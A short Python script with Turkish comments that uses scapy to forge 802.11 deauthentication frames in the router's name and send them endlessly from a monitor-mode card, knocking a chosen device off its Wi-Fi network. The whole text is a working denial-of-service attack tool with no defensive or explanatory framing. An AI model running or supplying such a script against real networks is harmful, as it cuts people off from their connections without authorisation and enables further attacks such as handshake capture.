from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp

# Monitor Modundaki Kart Adı
interface = "wlan0mon" 
target_mac = input("Hedef Cihazın MAC Adresi: ")
gateway_mac = input("Modem MAC Adresi: ")

# Deauth Paketi Oluştur
# addr1=Hedef, addr2=Modem, addr3=Modem
packet = RadioTap() / Dot11(addr1=target_mac, addr2=gateway_mac, addr3=gateway_mac) / Dot11Deauth()

print(f"[*] {target_mac} cihazı ağdan atılıyor... (CTRL+C ile durdur)")

while True:
    try:
        # count=1 -> Her döngüde 1 paket, sürekli döngü
        sendp(packet, iface=interface, count=1, inter=0.1, verbose=0)
    except KeyboardInterrupt:
        break